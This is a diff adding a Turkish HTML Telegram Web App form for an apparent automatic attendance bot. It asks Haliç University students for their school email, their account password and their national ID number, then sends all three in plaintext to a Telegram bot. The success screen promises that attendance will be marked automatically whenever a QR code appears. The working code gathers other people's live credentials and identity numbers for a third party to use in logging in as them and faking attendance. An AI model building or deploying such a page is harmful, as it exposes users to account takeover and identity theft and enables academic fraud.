@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Kayıt Ol</title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    :root {
+      --bg: #0f0f13;
+      --card: #1a1a24;
+      --border: #2a2a38;
+      --accent: #6c63ff;
+      --accent2: #4fc3f7;
+      --text: #f0f0f5;
+      --muted: #6b6b80;
+      --error: #ff5c7a;
+      --success: #4caf50;
+      --input-bg: #13131c;
+    }
+
+    body {
+      background: var(--bg);
+      min-height: 100vh;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      color: var(--text);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 24px 20px;
+    }
+
+    /* Arka plan parıltısı */
+    body::before {
+      content: '';
+      position: fixed;
+      top: -30%;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 500px;
+      height: 400px;
+      background: radial-gradient(ellipse, rgba(108,99,255,0.12) 0%, transparent 70%);
+      pointer-events: none;
+    }
+
+    .logo-wrap {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 32px;
+    }
+
+    .logo-icon {
+      width: 64px;
+      height: 64px;
+      border-radius: 18px;
+      background: linear-gradient(135deg, #6c63ff, #4fc3f7);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 28px;
+      box-shadow: 0 8px 32px rgba(108,99,255,0.35);
+    }
+
+    .logo-wrap h1 {
+      font-size: 20px;
+      font-weight: 700;
+      letter-spacing: 0.3px;
+    }
+
+    .logo-wrap p {
+      font-size: 13px;
+      color: var(--muted);
+      text-align: center;
+    }
+
+    .card {
+      width: 100%;
+      max-width: 380px;
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 20px;
+      padding: 28px 24px;
+    }
+
+    .field {
+      margin-bottom: 16px;
+    }
+
+    .field label {
+      display: block;
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--muted);
+      text-transform: uppercase;
+      letter-spacing: 0.8px;
+      margin-bottom: 8px;
+    }
+
+    .input-wrap {
+      position: relative;
+      display: flex;
+      align-items: center;
+    }
+
+    .input-icon {
+      position: absolute;
+      left: 14px;
+      font-size: 16px;
+      opacity: 0.5;
+      pointer-events: none;
+    }
+
+    .field input {
+      width: 100%;
+      background: var(--input-bg);
+      border: 1.5px solid var(--border);
+      border-radius: 12px;
+      padding: 13px 14px 13px 42px;
+      font-size: 15px;
+      color: var(--text);
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s;
+      -webkit-appearance: none;
+    }
+
+    .field input::placeholder { color: var(--muted); }
+
+    .field input:focus {
+      border-color: var(--accent);
+      box-shadow: 0 0 0 3px rgba(108,99,255,0.15);
+    }
+
+    .field input.error {
+      border-color: var(--error);
+      box-shadow: 0 0 0 3px rgba(255,92,122,0.12);
+    }
+
+    /* Şifre göster/gizle */
+    .toggle-pw {
+      position: absolute;
+      right: 14px;
+      background: none;
+      border: none;
+      cursor: pointer;
+      font-size: 16px;
+      opacity: 0.45;
+      padding: 4px;
+      transition: opacity 0.2s;
+    }
+    .toggle-pw:hover { opacity: 0.8; }
+
+    .field-error {
+      font-size: 12px;
+      color: var(--error);
+      margin-top: 6px;
+      display: none;
+    }
+    .field-error.show { display: block; }
+
+    /* Submit butonu */
+    .btn-submit {
+      width: 100%;
+      padding: 15px;
+      margin-top: 8px;
+      background: linear-gradient(135deg, #6c63ff, #4fc3f7);
+      border: none;
+      border-radius: 12px;
+      font-size: 15px;
+      font-weight: 700;
+      color: #fff;
+      cursor: pointer;
+      letter-spacing: 0.3px;
+      transition: opacity 0.2s, transform 0.1s;
+      position: relative;
+      overflow: hidden;
+    }
+    .btn-submit:active { transform: scale(0.98); }
+    .btn-submit:disabled { opacity: 0.5; cursor: not-allowed; }
+
+    .btn-submit .btn-text { transition: opacity 0.2s; }
+    .btn-submit .btn-loader {
+      display: none;
+      position: absolute;
+      inset: 0;
+      align-items: center;
+      justify-content: center;
+    }
+    .btn-submit.loading .btn-text { opacity: 0; }
+    .btn-submit.loading .btn-loader { display: flex; }
+
+    .spinner {
+      width: 20px;
+      height: 20px;
+      border: 2.5px solid rgba(255,255,255,0.3);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* Toast bildirimi */
+    .toast {
+      position: fixed;
+      bottom: 32px;
+      left: 50%;
+      transform: translateX(-50%) translateY(80px);
+      background: #1e1e2e;
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 12px 20px;
+      font-size: 13px;
+      font-weight: 500;
+      white-space: nowrap;
+      transition: transform 0.3s cubic-bezier(0.34,1.56,0.64,1);
+      z-index: 100;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+    }
+    .toast.show { transform: translateX(-50%) translateY(0); }
+    .toast.success { border-color: var(--success); color: var(--success); }
+    .toast.error   { border-color: var(--error);   color: var(--error); }
+
+    /* Başarı ekranı */
+    .success-screen {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      gap: 14px;
+      text-align: center;
+    }
+    .success-screen.show { display: flex; }
+    .card.hide { display: none; }
+
+    .check-circle {
+      width: 80px;
+      height: 80px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #4caf50, #81c784);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 38px;
+      box-shadow: 0 8px 32px rgba(76,175,80,0.4);
+      animation: pop 0.4s cubic-bezier(0.34,1.56,0.64,1);
+    }
+    @keyframes pop {
+      0%   { transform: scale(0); opacity: 0; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+    .success-screen h2 { font-size: 22px; font-weight: 700; }
+    .success-screen p  { font-size: 14px; color: var(--muted); line-height: 1.5; }
+  </style>
+</head>
+<body>
+
+<div class="logo-wrap">
+  <div class="logo-icon">🎓</div>
+  <h1>Yoklama Sistemi</h1>
+  <p>Otomatik yoklama için bilgilerini gir</p>
+</div>
+
+<div class="card" id="form-card">
+  <div class="field">
+    <label>Okul E-postası</label>
+    <div class="input-wrap">
+      <span class="input-icon">✉️</span>
+      <input type="email" id="email" placeholder="20xxxxx@ogr.halic.edu.tr" autocomplete="off" />
+    </div>
+    <div class="field-error" id="email-err">Geçerli bir e-posta gir</div>
+  </div>
+
+  <div class="field">
+    <label>Şifre</label>
+    <div class="input-wrap">
+      <span class="input-icon">🔒</span>
+      <input type="password" id="password" placeholder="Halic şifreni gir" autocomplete="off" />
+      <button class="toggle-pw" onclick="togglePw()" type="button" id="pw-eye">👁</button>
+    </div>
+    <div class="field-error" id="pw-err">Şifre boş olamaz</div>
+  </div>
+
+  <div class="field">
+    <label>T.C. Kimlik No</label>
+    <div class="input-wrap">
+      <span class="input-icon">🪪</span>
+      <input type="text" id="tckn" placeholder="11 haneli T.C. kimlik no" maxlength="11" inputmode="numeric" />
+    </div>
+    <div class="field-error" id="tckn-err">Geçerli bir T.C. kimlik no gir (11 hane)</div>
+  </div>
+
+  <button class="btn-submit" id="submit-btn" onclick="submit()">
+    <span class="btn-text">Kayıt Ol</span>
+    <span class="btn-loader"><div class="spinner"></div></span>
+  </button>
+</div>
+
+<div class="success-screen" id="success-screen">
+  <div class="check-circle">✓</div>
+  <h2>Kayıt Tamamlandı!</h2>
+  <p>Artık QR geldiğinde yoklaman<br>otomatik olarak gönderilecek.</p>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+  const tg = window.Telegram.WebApp;
+  tg.expand();
+  tg.disableClosingConfirmation();
+
+  function togglePw() {
+    const pw = document.getElementById('password');
+    const eye = document.getElementById('pw-eye');
+    if (pw.type === 'password') {
+      pw.type = 'text';
+      eye.textContent = '🙈';
+    } else {
+      pw.type = 'password';
+      eye.textContent = '👁';
+    }
+  }
+
+  function showToast(msg, type = 'error') {
+    const t = document.getElementById('toast');
+    t.textContent = (type === 'error' ? '❌ ' : '✅ ') + msg;
+    t.className = `toast ${type} show`;
+    setTimeout(() => t.classList.remove('show'), 3000);
+  }
+
+  function setLoading(on) {
+    const btn = document.getElementById('submit-btn');
+    btn.disabled = on;
+    btn.classList.toggle('loading', on);
+  }
+
+  function validate() {
+    let ok = true;
+
+    const email = document.getElementById('email').value.trim();
+    const emailErr = document.getElementById('email-err');
+    const emailInput = document.getElementById('email');
+    if (!email || !email.includes('@')) {
+      emailErr.classList.add('show');
+      emailInput.classList.add('error');
+      ok = false;
+    } else {
+      emailErr.classList.remove('show');
+      emailInput.classList.remove('error');
+    }
+
+    const pw = document.getElementById('password').value;
+    const pwErr = document.getElementById('pw-err');
+    const pwInput = document.getElementById('password');
+    if (!pw) {
+      pwErr.classList.add('show');
+      pwInput.classList.add('error');
+      ok = false;
+    } else {
+      pwErr.classList.remove('show');
+      pwInput.classList.remove('error');
+    }
+
+    const tckn = document.getElementById('tckn').value.trim();
+    const tcknErr = document.getElementById('tckn-err');
+    const tcknInput = document.getElementById('tckn');
+    if (!tckn || tckn.length !== 11 || !/^\d+$/.test(tckn)) {
+      tcknErr.classList.add('show');
+      tcknInput.classList.add('error');
+      ok = false;
+    } else {
+      tcknErr.classList.remove('show');
+      tcknInput.classList.remove('error');
+    }
+
+    return ok;
+  }
+
+  function submit() {
+    if (!validate()) return;
+
+    const email    = document.getElementById('email').value.trim();
+    const password = document.getElementById('password').value;
+    const tckn     = document.getElementById('tckn').value.trim();
+
+    setLoading(true);
+
+    const data = JSON.stringify({ email, password, tckn });
+
+    // Başarı göster, bota gönder
+    setTimeout(() => {
+      document.getElementById('form-card').classList.add('hide');
+      document.getElementById('success-screen').classList.add('show');
+      setTimeout(() => tg.sendData(data), 1200);
+    }, 600);
+  }
+
+  // Sadece rakam girişi — TCKN
+  document.getElementById('tckn').addEventListener('input', function() {
+    this.value = this.value.replace(/\D/g, '');
+  });
+</script>
+
+</body>
+</html>
